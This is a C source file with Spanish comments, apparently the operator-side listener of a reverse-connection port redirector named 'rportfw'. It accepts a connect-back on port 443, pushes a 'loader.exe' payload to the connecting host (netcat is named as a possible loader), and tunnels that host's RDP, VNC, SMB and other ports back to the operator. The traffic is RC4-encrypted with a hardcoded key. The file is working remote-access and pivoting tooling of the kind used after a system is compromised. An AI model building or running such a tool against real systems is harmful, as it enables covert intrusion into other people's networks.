
/***********************************************************
 * Redirector de puertos por conexion inversa para Windows
 * gcc -Wall -O2 client.c rc4.c -o client -lz \
 * 	-DLOADER -DCRYPT -DCOMP -DDEBUG
 ***********************************************************/

#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#ifdef COMP
#include <zlib.h>
#endif
#ifdef CRYPT
#include "rc4.h"
#endif


/******************
* config
*******************/

// puerto de escucha (client)
#define HOST "0.0.0.0"
#define PORT 443 

// contrasenia cifrado
#define SKEY "secret0"

// IP bind 
#define BIND_ADDR "127.0.0.1"

// path netcat, nsh y nof
#define LOADER_PATH "loader.exe"

// puertos a redirigir? 
#define NUM_CHAN 7
#define SET_CHANNELS(chan) { \
\
	chan[0].port = 6666; \
	chan[0].flags = X_CRYPT; \
	chan[1].port = 6667; \
	chan[1].flags = X_CRYPT; \
	chan[2].port = 6668; \
	chan[2].flags = X_CRYPT; \
	chan[3].port = 6669; \
	chan[3].flags = 0; \
	chan[4].port = 5900; \
	chan[4].flags = X_CRYPT; \
	chan[5].port = 3389; \
	chan[5].flags = 0; \
	chan[6].port = 445; \
	chan[6].flags = 0; \
}

// debug ?
#ifdef DEBUG
#define VERBOSE 1
#else
#define VERBOSE 0
#endif

// --- normalmente hasta aqui ---

// banner 
#define BANNER "rportfw v0.4 (C) 2014 Jose Ignacio Bravo"

// prompt cmd line
#define PROMPT "(client) "

// tamanio baffers
#define SZ_SBUF 1024

// timeout (ms) lectura socket (client, rportfw)
#define TIMEOUT 100

// para control errores
#define MAGIC 0xFE


/******************
* macros aux
*******************/

// varios
#define SZ_MSG_HD 	sizeof(msg_hd)
#define MAX(x, y) 	(x > y ? x : y)

// muestra msg
#define MSG(...) 	{ \
				printf(PROMPT); \
				printf("%s * ", time_stamp()); \
				printf(__VA_ARGS__); \
			}

// muestra msg
#define DBG(...) 	if (VERBOSE) \
			{ \
				printf(PROMPT); \
				printf("%s * ", time_stamp()); \
				printf(__VA_ARGS__); \
			}

//  msg error y sale
#define ABORT(...) { \
                        if (VERBOSE) \
                        { \
                                fprintf(stderr, PROMPT); \
                                fprintf(stderr, "%s * ", time_stamp()); \
                                fprintf(stderr, "Abort: %s, line: %d\n", __FILE__, __LINE__); \
                                if (errno) \
                                { \
                                        fprintf(stderr, PROMPT); \
                                        fprintf(stderr, "%s * ", time_stamp()); \
                                        perror("Abort"); \
                                } \
                        } \
			fprintf(stderr, PROMPT); \
			fprintf(stderr, "%s * ", time_stamp()); \
                        fprintf(stderr, "Abort: "); \
                        fprintf(stderr, __VA_ARGS__); \
			goto on_exit; \
}

// ejecuta, si -1, sale
#define TRY(x, msg) 	if ((x) == -1) ABORT(msg"\n")

// flags header
#ifdef COMP
#define X_COMP 		0x01
#define IS_COMP(x) 	(x & X_COMP)
#endif
#ifdef CRYPT
#define X_CRYPT 	0x02
#define IS_CRYPT(x) 	(x & X_CRYPT)
#endif


/******************
* tipos globales
*******************/

// ---------------
// port forwarding
// ---------------
typedef struct {

	u_char up;	 	// abierto canal ?
	uint16_t port; 		// puerto local
	int bind, sock; 	// socket 
	uint8_t flags;		// cifrado ? comprimido ?

} t_chan;

// ---------------------
// cabecera comunicacion
// ---------------------
typedef struct {

	uint8_t magic; 		// ctrl errores 
	uint8_t ch; 		// canal
	uint16_t sz;		// tamanio datos

} t_msg_hd; 


/******************
* variables globales
*******************/

// salr ?
int cont = 1;

/******************
* funciones
*******************/

// ----------------
// string timestamp
// ----------------
char *time_stamp()
{
        static char sbuf[25];
        time_t t = time(0);

        strcpy(sbuf, ctime(&t));
        sbuf[sizeof(sbuf) - 1] = 0;

        return sbuf;
}

// --------------
// cerramos canal
// --------------
void close_chan(t_chan *ch)
{
	if (ch->up) {

		shutdown(ch->sock, SHUT_RDWR);
		close(ch->sock);
		ch->up = 0;
	}
}

// -------------
// salida limpia
// -------------
void do_exit(int c) { cont = 0; }

// -------------------------
// configura manejadores int
// -------------------------
void set_handlers()
{
        struct sigaction sig;

        sig.sa_handler = do_exit;
        sig.sa_flags = 0;
        sigemptyset(&sig.sa_mask);

	// configuramos term e int
        sigaction(SIGTERM, &sig, 0);
        sigaction(SIGINT, &sig, 0);

	// ignoramos sigpipe
	signal(SIGPIPE, SIG_IGN);
}

#ifdef COMP 

// ----------
// compresion
// ----------
int z_comp(char *sbuf, int *sz)
{
	unsigned long zlen = SZ_SBUF;
	static u_char zbuf[SZ_SBUF];


	// comprimir
	if (compress(zbuf, &zlen, (u_char *) sbuf, *sz) != Z_OK) 
		return -1;

	// sobreescribimos
	memcpy(sbuf, zbuf, *sz = zlen); 

	return 0;
}

// -------------
// descompresion
// -------------
int z_uncomp(char *sbuf, int *sz)
{
	unsigned long zlen = SZ_SBUF;
	static u_char zbuf[SZ_SBUF];

	// comprimir
	if (uncompress(zbuf, &zlen, (u_char *) sbuf, *sz) != Z_OK) 
		return -1;

	// sobreescribimos
	memcpy(sbuf, zbuf, *sz = zlen); 

	return 0;
}

#endif

// ---------------------------
// recv con control de errores
// ---------------------------
int x_recv(int sock, void *sbuf, size_t sz, int flags)
{
	// llamamos a recv
	if ((sz = recv(sock, sbuf, sz, flags)) == -1) {

		// error ?
		switch (errno) {

			case EINTR:
			case EAGAIN: return 0;

			default: return -1;
		}
	}

	return sz;
}

// ---------------------------
// send con control de errores
// ---------------------------
int x_send(int sock, void *sbuf, size_t sz, int flags)
{
	// llamamos a send
	if ((sz = send(sock, sbuf, sz, flags)) == -1) {

		// error ?
		switch (errno) {

			case EINTR:
			case EAGAIN: return 0;

			default: return -1;
		}
	}

	return sz;
}

// -----------------
// funcion principal
// -----------------
int main()
{
	char sbuf[SZ_SBUF];
	struct sockaddr_in sa;
	int bsock = -1, sock = -1, r;
	int sz, i, on = 1, max = 0;
	t_msg_hd msg_hd; 
	t_chan *ch;
        fd_set rs;
        struct timeval tv;
	socklen_t len = sizeof(struct sockaddr);
	t_chan chan[NUM_CHAN];
#ifdef CRYPT
	struct rc4_state k; 
#endif
#ifdef LOADER
	struct stat st; 
	FILE *f;
#endif
	
	// desactivamos buffer salida
	setbuf(stdout, 0);


	/*** inicio ***/

        printf("%s\n", BANNER);
        printf("Starting client...\n\n");

	// config channels
	memset(chan, 0, sizeof(chan));
	SET_CHANNELS(chan); 

        // manejador int
        set_handlers();

#ifdef CRYPT
	// init crypt 
	rc4_setup(&k, (u_char *) SKEY, sizeof(SKEY));
#endif


	/*** ponemos a escucha ***/

	MSG("Listening on %s:%d...\n", HOST, PORT);

	// creamos socket
	TRY(bsock = socket(AF_INET, SOCK_STREAM, 0), "socket");
	
	// permitimos reutilizacion ip:port (time_wait)
	TRY(setsockopt(bsock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)), "setsockopt");

	// parametros conexion
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT);
	sa.sin_addr.s_addr = inet_addr(HOST);

	// asociamos socket  a ip:port
	TRY(bind(bsock, (struct sockaddr *) &sa, sizeof(sa)), "bind");

	// ponemos a escucha
	TRY(listen(bsock, 0), "listen"); 

	// esperamos conexiones
	TRY(sock = accept(bsock, (struct sockaddr *) &sa, &len), "accept");


	/*** conectados ***/

	MSG("Conected from %s:%d...\n", inet_ntoa(sa.sin_addr), sa.sin_port);


#ifdef LOADER

	/***  enviamos loader.exe ***/ 

	MSG("Sending '%s'...\n", LOADER_PATH); 

	// abrimos fichero 
	if ((f = fopen(LOADER_PATH, "rb"))) {

		// primero enviamos tamanio 
		TRY(stat(LOADER_PATH, &st), "stat");
		TRY(x_send(sock, &(st.st_size), sizeof(sz), 0), "send");

		// leemos contenido fichero y enviamos
		while (!feof(f))
			if ((sz = fread(sbuf, 1, SZ_SBUF, f)))
				TRY(x_send(sock, sbuf, sz, 0), "send");

		// cerramos fichero
		fclose(f);

	} else ABORT("loader\n");
	

#endif
	

	/*** ponemos a la escucha puertos remotos redirigidos ***/

	// preparacion para accept 
	for (i = 0; i < NUM_CHAN; i++) {

		// para escribir menos ;)
		ch = &chan[i];

		MSG("Listening on %s:%d...\n", BIND_ADDR, ch->port);

		// creacion socket (no bloq!)
		TRY(ch->bind = socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK, 0), "socket");

		// config para forzar reutilizacion
		TRY(setsockopt(ch->bind, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on)), "setsockopt");

		// asociamos socket a ip:port
		sa.sin_family = AF_INET;
		sa.sin_port = htons(ch->port);
		sa.sin_addr.s_addr = inet_addr(BIND_ADDR);

		// sock <-> ip:puerto
		TRY(bind(ch->bind, (struct sockaddr *) &sa, sizeof(sa)), "bind");

		// ponemos a escucha
		TRY(listen(ch->bind, 0), "listen");
	}


	/*** intercambio de datos entre sockets ***/

	// hasta CTRL+C o cierre de conexion
	while (cont) {

		// marcamos para lectura
		FD_ZERO(&rs); 
		FD_SET(sock, &rs);
		max = sock;

		// sockets a revisar en io select 
		for (i = 0; i < NUM_CHAN; i++) {
			
			// para escribir menos ;)
			ch = &chan[i];

			// si canal activo, revisamos .sock 
			if (ch->up) { 

				FD_SET(ch->sock, &rs);
				max = MAX(max, ch->sock);

			// si no, revisamos .bind
			} else { 

				FD_SET(ch->bind, &rs);
				max = MAX(max, ch->bind);
			}
		}

		// config timeout para lectura
		tv.tv_sec = 0; tv.tv_usec = 1000 * TIMEOUT;

		// comprobacion i/o lectura en sockets
		if ((r = select(max + 1, &rs, 0, 0, &tv)) > 0) {

			/*** comprobamos canal principal ***/

			// client -> local:port
			if (FD_ISSET(sock, &rs)) {

				DBG("Reading remote...\n");

				// uno menos que atender
				r--;

				// si hay datos, procesamos
				if ((sz = x_recv(sock, &msg_hd, SZ_MSG_HD, 0)) > 0) {

					// keep-alive ? canal 255 reservado, respondemos
					if (msg_hd.magic == MAGIC && msg_hd.ch == 255) {

						DBG("Keepalive...\n");
						TRY(x_send(sock, &msg_hd, SZ_MSG_HD, 0 ), "send");

					} else { 

						// para escribir menos ;)
						if ((i = msg_hd.ch) < NUM_CHAN) ch = &chan[i];

						// control de errores: paquete corrputo, etc...
						if (msg_hd.magic != MAGIC || msg_hd.sz > SZ_SBUF || i >= NUM_CHAN) {

							MSG("Packet corrupt!\n");

							// cerramos el canal ?
							if (i < NUM_CHAN) {

								MSG("Closing channel %d...\n", i);
								close_chan(ch);
							}

						// se enviaran mas datos ?
						} else if (msg_hd.sz) {

							DBG("Remote -> local (%d): %d bytes\n", i, msg_hd.sz);

							// en ese caso, recuperamos info
							TRY(sz = x_recv(sock, sbuf, msg_hd.sz, MSG_WAITALL), "recv");

							// control de errores: tamanio > max, etc...
							if (sz != msg_hd.sz) {

								MSG("Packet corrupt, closing channel %d...\n", i);
								close_chan(ch);

							// dodo esta ok ?
							} else {
#ifdef CRYPT
								// desciframos datos, si aplica 
								if (IS_CRYPT(ch->flags)) rc4_crypt(&k, (u_char *) sbuf, sz);
#endif
#ifdef COMP
								// descomprimimos datos, si aplica
								if (IS_COMP(ch->flags)) TRY(z_uncomp(sbuf, &sz), "uncomp");
#endif

								// y enviamos datos a la conexion
								TRY(x_send(ch->sock, sbuf, sz, 0), "send");
							}

						// si se ha cerrado la conexion del otro lado
						} else if (ch->up) {

							MSG("Channel %d closed!\n", i);

							// cerramos canal
							close_chan(ch);
						} 
					}

				// se ha desconectado la conexion principal ?
				} else {

					MSG("Connection closed!\n");
					break;
				}
			}


			/*** comprobamos puertos redirigidos ***/

			// para cada canal, espera conexion ? se han recibido datos ?
			for (i = 0; r && i < NUM_CHAN; i++) {

				// para escribir menos
				ch = &chan[i];

				// si canal cerrado... abrimos ?
				if (!ch->up && FD_ISSET(ch->bind, &rs)) {

					MSG("Opening channel %d...\n", i);

					// unos menos que atender
					r--;

					// algun error al aceptar ??
					TRY(ch->sock = accept(ch->bind, (struct sockaddr *) &sa, &len), "accept");

					// marcamos como abierto 
					ch->up = 1;

					// construimos cabecera
					msg_hd.magic = MAGIC;
					msg_hd.ch = i; 
					msg_hd.sz = 0;	// ojo!

					// enviamos cabecera (abrir) 
					TRY(x_send(sock, &msg_hd, SZ_MSG_HD, 0), "send");

				// hay datos en el socket asociado ?
				} else if (ch->up && FD_ISSET(ch->sock, &rs)) {

					DBG("Reading local...\n");

					// unos menos que atender
					r--;

					// construimos cabecera
					msg_hd.magic = MAGIC;
					msg_hd.ch = i; 

					// hay datos
					if ((sz = x_recv(ch->sock, sbuf, SZ_SBUF, 0))) {
#ifdef COMP
						// comprimimos datos, si aplica
						if (IS_COMP(ch->flags)) TRY(z_comp(sbuf, &sz), "comp");
#endif
#ifdef CRYPT
						// ciframos datos, si aplica
						if (IS_CRYPT(ch->flags)) rc4_crypt(&k, (u_char *) sbuf, sz);
#endif
						// enviamos cabecera
						msg_hd.sz = sz;
						TRY(x_send(sock, &msg_hd, SZ_MSG_HD, 0), "send");

						// enviamos datos
						TRY(x_send(sock, sbuf, sz, 0), "send");

						DBG("Local -> remote (%d): %d bytes\n", i, sz);

					// si no hay datos, se ha cerrado  el canal
					} else {

						MSG("Channel %d closed!\n", i);

						// enviamos cabecera
						msg_hd.sz = 0;
						TRY(x_send(sock, &msg_hd, SZ_MSG_HD, 0), "send");

						// cerramos canal 
						close_chan(ch);
					}
				}
			}
		}
	}

on_exit:

	// salimos
        MSG("Exiting...\n");
        MSG("Closing sockets...\n");

	// socks conexion cliente
	shutdown(sock, SHUT_RDWR);
        close(sock); close(bsock);

	// socks port forwarding
	for (i = 0; i < NUM_CHAN ; i++) {

		// cerramos conexion
		close_chan(&chan[i]);

		// dejamos de escuchar
		close(chan[i].bind);
	}

        MSG(">>> Done <<<\n\n");

	return cont;
}
